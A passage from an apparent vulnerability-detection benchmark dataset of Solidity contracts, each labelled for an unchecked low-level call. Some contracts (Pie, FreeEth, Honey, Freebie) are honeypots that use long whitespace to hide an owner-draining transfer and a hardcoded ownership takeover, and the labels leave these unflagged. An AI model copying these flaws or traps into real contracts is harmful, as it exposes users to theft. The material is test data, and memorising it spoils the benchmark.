    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 14",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xbaa3de6504690efb064420d89e871c27065cdd52.sol",
    "pragma": "0.4.23",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.24;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract VaultProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.5 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
    "vulnerable_function": "proxy",
    "vulnerable_lines": [
      14
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 14",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xd2018bfaa266a9ec0a1a84b061640faa009def76",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Pie\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function Get()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xd5967fed03e85d1cce44cab284695b41bc675b5c",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n \ncontract demo{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      16
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 16",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xdb1c55f6926e7d847ddf8678905ad871a68199d2",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 39\n */\n\npragma solidity ^0.4.19;\n\ncontract FreeEth\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      39
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 39",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xe09b1ab8111c2729a76f16de96bc86a7af837928",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xe09b1ab8111c2729a76f16de96bc86a7af837928.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 150\n */\n\npragma solidity ^0.4.24;\n\n/* This is fiftyflip \na simple yet elegant game contract \nthat is connected to Proof of Community \ncontract(0x1739e311ddBf1efdFbc39b74526Fd8b600755ADa).\n\nGreed serves no-one but the one, \nBut charity is kind, suffereth not and envieth not. \nCharity is to give of oneself in the service of his fellow beings. \n\nPlay on Players. and Remember fifty feeds the multiudes and gives to the PoC community\nForever and ever. \n\n\n*/\n\n\ncontract FiftyFlip {\n    uint constant DONATING_X = 20; // 2% kujira\n\n    // Need to be discussed\n    uint constant JACKPOT_FEE = 10; // 1% jackpot\n    uint constant JACKPOT_MODULO = 1000; // 0.1% jackpotwin\n    uint constant DEV_FEE = 20; // 2% devfee\n    uint constant WIN_X = 1900; // 1.9x\n\n    // There is minimum and maximum bets.\n    uint constant MIN_BET = 0.01 ether;\n    uint constant MAX_BET = 1 ether;\n\n    uint constant BET_EXPIRATION_BLOCKS = 250;\n\n    // owner and PoC contract address\n    address public owner;\n    address public autoPlayBot;\n    address public secretSigner;\n    address private whale;\n\n    // Accumulated jackpot fund.\n    uint256 public jackpotSize;\n    uint256 public devFeeSize;\n\n    // Funds that are locked in potentially winning bets.\n    uint256 public lockedInBets;\n    uint256 public totalAmountToWhale;\n\n\n    struct Bet {\n        // Wager amount in wei.\n        uint amount;\n        // Block number of placeBet tx.\n        uint256 blockNumber;\n        // Bit mask representing winning bet outcomes (see MAX_MASK_MODULO comment).\n        bool betMask;\n        // Address of a player, used to pay out winning bets.\n        address player;\n    }\n\n    mapping (uint => Bet) bets;\n    mapping (address => uint) donateAmount;\n\n    // events\n    event Wager(uint ticketID, uint betAmount, uint256 betBlockNumber, bool betMask, address betPlayer);\n    event Win(address winner, uint amount, uint ticketID, bool maskRes, uint jackpotRes);\n    event Lose(address loser, uint amount, uint ticketID, bool maskRes, uint jackpotRes);\n    event Refund(uint ticketID, uint256 amount, address requester);\n    event Donate(uint256 amount, address donator);\n    event FailedPayment(address paidUser, uint amount);\n    event Payment(address noPaidUser, uint amount);\n    event JackpotPayment(address player, uint ticketID, uint jackpotWin);\n\n    // constructor\n    constructor (address whaleAddress, address autoPlayBotAddress, address secretSignerAddress) public {\n        owner = msg.sender;\n        autoPlayBot = autoPlayBotAddress;\n        whale = whaleAddress;\n        secretSigner = secretSignerAddress;\n        jackpotSize = 0;\n        devFeeSize = 0;\n        lockedInBets = 0;\n        totalAmountToWhale = 0;\n    }\n\n    // modifiers\n    modifier onlyOwner() {\n        require (msg.sender == owner, \"You are not the owner of this contract!\");\n        _;\n    }    \n\n    modifier onlyBot() {\n        require (msg.sender == autoPlayBot, \"You are not the bot of this contract!\");\n        _;\n    }\n    \n    modifier checkContractHealth() {\n        require (address(this).balance >= lockedInBets + jackpotSize + devFeeSize, \"This contract doesn't have enough balance, it is stopped till someone donate to this game!\");\n        _;\n    }\n\n    // betMast:\n    // false is front, true is back\n\n    function() public payable { }\n\n\n    function setBotAddress(address autoPlayBotAddress)\n    onlyOwner() \n    external \n    {\n        autoPlayBot = autoPlayBotAddress;\n    }\n\n    function setSecretSigner(address _secretSigner)\n    onlyOwner()  \n    external\n    {\n        secretSigner = _secretSigner;\n    }\n\n    // wager function\n    function wager(bool bMask, uint ticketID, uint ticketLastBlock, uint8 v, bytes32 r, bytes32 s)  \n    checkContractHealth()\n    external\n    payable { \n        Bet storage bet = bets[ticketID];\n        uint amount = msg.value;\n        address player = msg.sender;\n        require (bet.player == address(0), \"Ticket is not new one!\");\n        require (amount >= MIN_BET, \"Your bet is lower than minimum bet amount\");\n        require (amount <= MAX_BET, \"Your bet is higher than maximum bet amount\");\n        require (getCollateralBalance() >= 2 * amount, \"If we accept this, this contract will be in danger!\");\n\n        require (block.number <= ticketLastBlock, \"Ticket has expired.\");\n        bytes32 signatureHash = keccak256(abi.encodePacked('\\x19Ethereum Signed Message:\\n37', uint40(ticketLastBlock), ticketID));\n        require (secretSigner == ecrecover(signatureHash, v, r, s), \"web3 vrs signature is not valid.\");\n\n        jackpotSize += amount * JACKPOT_FEE / 1000;\n        devFeeSize += amount * DEV_FEE / 1000;\n        lockedInBets += amount * WIN_X / 1000;\n\n        uint donate_amount = amount * DONATING_X / 1000;\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(donate_amount)(bytes4(keccak256(\"donate()\")));\n        totalAmountToWhale += donate_amount;\n\n        bet.amount = amount;\n        bet.blockNumber = block.number;\n        bet.betMask = bMask;\n        bet.player = player;\n\n        emit Wager(ticketID, bet.amount, bet.blockNumber, bet.betMask, bet.player);\n    }\n\n    // method to determine winners and losers\n    function play(uint ticketReveal)\n    checkContractHealth()\n    external\n    {\n        uint ticketID = uint(keccak256(abi.encodePacked(ticketReveal)));\n        Bet storage bet = bets[ticketID];\n        require (bet.player != address(0), \"TicketID is not correct!\");\n        require (bet.amount != 0, \"Ticket is already used one!\");\n        uint256 blockNumber = bet.blockNumber;\n        if(blockNumber < block.number && blockNumber >= block.number - BET_EXPIRATION_BLOCKS)\n        {\n            uint256 random = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  ticketReveal)));\n            bool maskRes = (random % 2) !=0;\n            uint jackpotRes = random % JACKPOT_MODULO;\n    \n            uint tossWinAmount = bet.amount * WIN_X / 1000;\n\n            uint tossWin = 0;\n            uint jackpotWin = 0;\n            \n            if(bet.betMask == maskRes) {\n                tossWin = tossWinAmount;\n            }\n            if(jackpotRes == 0) {\n                jackpotWin = jackpotSize;\n                jackpotSize = 0;\n            }\n            if (jackpotWin > 0) {\n                emit JackpotPayment(bet.player, ticketID, jackpotWin);\n            }\n            if(tossWin + jackpotWin > 0)\n            {\n                payout(bet.player, tossWin + jackpotWin, ticketID, maskRes, jackpotRes);\n            }\n            else \n            {\n                loseWager(bet.player, bet.amount, ticketID, maskRes, jackpotRes);\n            }\n            lockedInBets -= tossWinAmount;\n            bet.amount = 0;\n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    function donateForContractHealth()\n    external \n    payable\n    {\n        donateAmount[msg.sender] += msg.value;\n        emit Donate(msg.value, msg.sender);\n    }\n\n    function withdrawDonation(uint amount)\n    external \n    {\n        require(donateAmount[msg.sender] >= amount, \"You are going to withdraw more than you donated!\");\n        \n        if (sendFunds(msg.sender, amount)){\n            donateAmount[msg.sender] -= amount;\n        }\n    }\n\n    // method to refund\n    function refund(uint ticketID)\n    checkContractHealth()\n    external {\n        Bet storage bet = bets[ticketID];\n        \n        require (bet.amount != 0, \"this ticket has no balance\");\n        require (block.number > bet.blockNumber + BET_EXPIRATION_BLOCKS, \"this ticket is expired.\");\n        sendRefund(ticketID);\n    }\n\n    // Funds withdrawl\n    function withdrawDevFee(address withdrawAddress, uint withdrawAmount)\n    onlyOwner()\n    checkContractHealth() \n    external {\n        require (devFeeSize >= withdrawAmount, \"You are trying to withdraw more amount than developer fee.\");\n        require (withdrawAmount <= address(this).balance, \"Contract balance is lower than withdrawAmount\");\n        require (devFeeSize <= address(this).balance, \"Not enough funds to withdraw.\");\n        if (sendFunds(withdrawAddress, withdrawAmount)){\n            devFeeSize -= withdrawAmount;\n        }\n    }\n\n    // Funds withdrawl\n    function withdrawBotFee(uint withdrawAmount)\n    onlyBot()\n    checkContractHealth() \n    external {\n        require (devFeeSize >= withdrawAmount, \"You are trying to withdraw more amount than developer fee.\");\n        require (withdrawAmount <= address(this).balance, \"Contract balance is lower than withdrawAmount\");\n        require (devFeeSize <= address(this).balance, \"Not enough funds to withdraw.\");\n        if (sendFunds(autoPlayBot, withdrawAmount)){\n            devFeeSize -= withdrawAmount;\n        }\n    }\n\n    // Get Bet Info from id\n    function getBetInfo(uint ticketID) \n    constant\n    external \n    returns (uint, uint256, bool, address){\n        Bet storage bet = bets[ticketID];\n        return (bet.amount, bet.blockNumber, bet.betMask, bet.player);\n    }\n\n    // Get Bet Info from id\n    function getContractBalance() \n    constant\n    external \n    returns (uint){\n        return address(this).balance;\n    }\n\n    // Get Collateral for Bet\n    function getCollateralBalance() \n    constant\n    public \n    returns (uint){\n        if (address(this).balance > lockedInBets + jackpotSize + devFeeSize)\n            return address(this).balance - lockedInBets - jackpotSize - devFeeSize;\n        return 0;\n    }\n\n    // Contract may be destroyed only when there are no ongoing bets,\n    // either settled or refunded. All funds are transferred to contract owner.\n    function kill() external onlyOwner() {\n        require (lockedInBets == 0, \"All bets should be processed (settled or refunded) before self-destruct.\");\n        selfdestruct(owner);\n    }\n\n    // Payout ETH to winner\n    function payout(address winner, uint ethToTransfer, uint ticketID, bool maskRes, uint jackpotRes) \n    internal \n    {        \n        winner.transfer(ethToTransfer);\n        emit Win(winner, ethToTransfer, ticketID, maskRes, jackpotRes);\n    }\n\n    // sendRefund to requester\n    function sendRefund(uint ticketID) \n    internal \n    {\n        Bet storage bet = bets[ticketID];\n        address requester = bet.player;\n        uint256 ethToTransfer = bet.amount;        \n        requester.transfer(ethToTransfer);\n\n        uint tossWinAmount = bet.amount * WIN_X / 1000;\n        lockedInBets -= tossWinAmount;\n\n        bet.amount = 0;\n        emit Refund(ticketID, ethToTransfer, requester);\n    }\n\n    // Helper routine to process the payment.\n    function sendFunds(address paidUser, uint amount) private returns (bool){\n        bool success = paidUser.send(amount);\n        if (success) {\n            emit Payment(paidUser, amount);\n        } else {\n            emit FailedPayment(paidUser, amount);\n        }\n        return success;\n    }\n    // Payout ETH to whale when player loses\n    function loseWager(address player, uint amount, uint ticketID, bool maskRes, uint jackpotRes) \n    internal \n    {\n        emit Lose(player, amount, ticketID, maskRes, jackpotRes);\n    }\n\n    // bulk clean the storage.\n    function clearStorage(uint[] toCleanTicketIDs) external {\n        uint length = toCleanTicketIDs.length;\n\n        for (uint i = 0; i < length; i++) {\n            clearProcessedBet(toCleanTicketIDs[i]);\n        }\n    }\n\n    // Helper routine to move 'processed' bets into 'clean' state.\n    function clearProcessedBet(uint ticketID) private {\n        Bet storage bet = bets[ticketID];\n\n        // Do not overwrite active bets with zeros; additionally prevent cleanup of bets\n        // for which ticketID signatures may have not expired yet (see whitepaper for details).\n        if (bet.amount != 0 || block.number <= bet.blockNumber + BET_EXPIRATION_BLOCKS) {\n            return;\n        }\n\n        bet.blockNumber = 0;\n        bet.betMask = false;\n        bet.player = address(0);\n    }\n\n    // A trap door for when someone sends tokens other than the intended ones so the overseers can decide where to send them.\n    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) \n    public \n    onlyOwner() \n    returns (bool success) \n    {\n        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n    }\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface \n{\n    function transfer(address to, uint256 tokens) public returns (bool success);\n}",
    "vulnerable_function": "wager",
    "vulnerable_lines": [
      150
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 3,
    "description": "Unchecked return value - low-level call result not validated at line(s) 150",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xe09b1ab8111c2729a76f16de96bc86a7af837928.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Honey\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 39\n */\n\npragma solidity ^0.4.19;\n\ncontract Freebie\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      39
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 39",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xe894d54dca59cb53fe9cbc5155093605c7068220",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xe894d54dca59cb53fe9cbc5155093605c7068220.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.24;\n \ncontract airDrop{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        uint _value = v * 10 ** _decimals;\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],_value);\n        }\n        return true;\n    }\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 17",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xe894d54dca59cb53fe9cbc5155093605c7068220.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xec329ffc97d75fe03428ae155fc7793431487f63",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xec329ffc97d75fe03428ae155fc7793431487f63.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 30\n */\n\npragma solidity ^0.4.11; /* originally >=0.4.11 */\n\ncontract Owned {\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public owner;\n\n    // This contract only defines a modifier and a few useful functions\n    // The function body is inserted where the special symbol \"_\" in the\n    // definition of a modifier appears.\n    modifier onlyOwner { if (msg.sender == owner) _; }\n\n    function changeOwner(address _newOwner) onlyOwner {\n        owner = _newOwner;\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        _dst.call.value(_value)(_data);\n    }\n}\n// to get the needed token functions in the contract\ncontract Token {\n    function transfer(address, uint) returns(bool);\n    function balanceOf(address) constant returns (uint);\n}\n\ncontract TokenSender is Owned {\n    Token public token; // the token we are working with\n    uint public totalToDistribute;\n\n    uint public next;\n\n\n    struct Transfer {\n        address addr;\n        uint amount;\n    }\n\n    Transfer[] public transfers;\n\n    function TokenSender(address _token) {\n        token = Token(_token);\n    }\n\n    // this is a used to save gas\n    uint constant D160 = 0x0010000000000000000000000000000000000000000;\n\n    // This is the function that makes the list of transfers and various\n    //  checks around that list, it is a little tricky, the data input is\n    //  structured with the `amount` and the (receiving) `addr` combined as one\n    //  long number and then this number is deconstructed in this function to\n    //  save gas and reduce the number of `0`'s that are needed to be stored\n    //   on the blockchain\n    function fill(uint[] data) onlyOwner {\n\n        // If the send has started then we just throw\n        if (next>0) throw;\n\n        uint acc;\n        uint offset = transfers.length;\n        transfers.length = transfers.length + data.length;\n        for (uint i = 0; i < data.length; i++ ) {\n            address addr = address( data[i] & (D160-1) );\n            uint amount = data[i] / D160;\n\n            transfers[offset + i].addr = addr;\n            transfers[offset + i].amount = amount;\n            acc += amount;\n        }\n        totalToDistribute += acc;\n    }\n    // This function actually makes the sends and tracks the amount of gas used\n    //  if it takes more gas than was sent with the transaction then this\n    //  function will need to be called a few times until\n    function run() onlyOwner {\n        if (transfers.length == 0) return;\n\n        // Keep next in the stack var mNext to save gas\n        uint mNext = next;\n\n        // Set the contract as finalized to avoid reentrance\n        next = transfers.length;\n\n        if ((mNext == 0 ) && ( token.balanceOf(this) != totalToDistribute)) throw;\n\n        while ((mNext<transfers.length) && ( gas() > 150000 )) {\n            uint amount = transfers[mNext].amount;\n            address addr = transfers[mNext].addr;\n            if (amount > 0) {\n                if (!token.transfer(addr, transfers[mNext].amount)) throw;\n            }\n            mNext ++;\n        }\n\n        // Set the next to the actual state.\n        next = mNext;\n    }\n\n\n    ///////////////////////\n    // Helper functions\n    ///////////////////////\n\n    function hasTerminated() constant returns (bool) {\n        if (transfers.length == 0) return false;\n        if (next < transfers.length) return false;\n        return true;\n    }\n\n    function nTransfers() constant returns (uint) {\n        return transfers.length;\n    }\n\n    function gas() internal constant returns (uint _gas) {\n        assembly {\n            _gas:= gas\n        }\n    }\n\n}\n",
    "vulnerable_function": "execute",
    "vulnerable_lines": [
      30
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Unchecked return value - low-level call result not validated at line(s) 30",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xec329ffc97d75fe03428ae155fc7793431487f63.sol",
    "pragma": "0.4.11",
    "source_url": "etherscan.io"
  },
  {
